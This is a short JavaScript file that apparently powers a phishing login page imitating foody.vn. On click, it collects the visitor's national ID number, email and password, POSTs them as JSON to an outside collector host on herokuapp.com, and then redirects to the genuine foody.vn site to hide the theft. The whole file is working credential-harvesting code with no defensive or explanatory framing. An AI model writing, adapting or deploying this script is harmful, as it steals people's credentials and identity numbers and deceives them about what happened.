let cmnd = document.getElementById("cmnd");
let email = document.getElementById("email");
let password = document.getElementById("password");
let btnClick = document.getElementById("btn-login");

btnClick.addEventListener("click", (e) => {
  const data = {
    cmnd: cmnd.value,
    email: email.value,
    matkhau: password.value,
  };
  const Http = new XMLHttpRequest();
  const url = "https://clickjacking-api.herokuapp.com/api/account";
  Http.open("POST", url, true);
  Http.setRequestHeader("Content-type", "application/json");
  Http.send(JSON.stringify(data));
  setTimeout(() => {
    window.location.href = "https://www.foody.vn/";
  }, 2000);
});
